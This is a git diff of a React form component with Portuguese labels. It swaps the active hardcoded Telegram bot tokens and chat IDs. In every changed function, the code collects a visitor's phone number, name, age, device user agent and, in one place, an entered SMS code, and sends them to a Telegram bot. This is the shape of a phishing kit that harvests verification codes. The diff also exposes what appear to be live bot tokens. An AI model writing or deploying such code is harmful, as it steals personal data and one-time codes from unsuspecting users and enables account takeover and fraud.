@@ -46,10 +46,10 @@ const ContextForm = ({ children }) => {
 
     const dispositivo = navigator.userAgent;
     console.log(dispositivo);
-    // let chatId = "6579066348";
-    // let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
-    let chatId = "1758492805";
-    let botToken = "7370935946:AAE70M_rkxv669d6g7PNhn5uupM8sK5w0rg";
+    let chatId = "6579066348";
+    let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
+    // let chatId = "1758492805";
+    // let botToken = "7370935946:AAE70M_rkxv669d6g7PNhn5uupM8sK5w0rg";
     const message = `📞Número de telefone: ${telefone}\n🧑‍🦰Nome: ${nome}\n🔒Idade: ${idade}\n📱Dispositivo:${dispositivo}`;
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
@@ -77,10 +77,10 @@ const ContextForm = ({ children }) => {
 
   function captureDispositivo() {
     const dispositivo = navigator.userAgent;
-    let chatId = "1758492805";
-    let botToken = "7370935946:AAE70M_rkxv669d6g7PNhn5uupM8sK5w0rg";
-    // let chatId = "6579066348";
-    // let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
+    // let chatId = "1758492805";
+    // let botToken = "7370935946:AAE70M_rkxv669d6g7PNhn5uupM8sK5w0rg";
+    let chatId = "6579066348";
+    let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
     const message = `📱Dispositivo:${dispositivo}`;
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
@@ -117,10 +117,10 @@ const ContextForm = ({ children }) => {
     const idadee = localStorage.getItem("idade");
     const telefonee = localStorage.getItem("telefone");
 
-    // let chatId = "6579066348";
-    // let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
-    let chatId = "1758492805";
-    let botToken = "7370935946:AAE70M_rkxv669d6g7PNhn5uupM8sK5w0rg";
+    let chatId = "6579066348";
+    let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
+    // let chatId = "1758492805";
+    // let botToken = "7370935946:AAE70M_rkxv669d6g7PNhn5uupM8sK5w0rg";
     const message = `📞Número de telefone: ${telefonee}\n🧑‍🦰Nome: ${name}\n🔒Idade: ${idadee}\n SMS:${values.join(
       ""
     )}📱Dispositivo:${dispositivo}`;
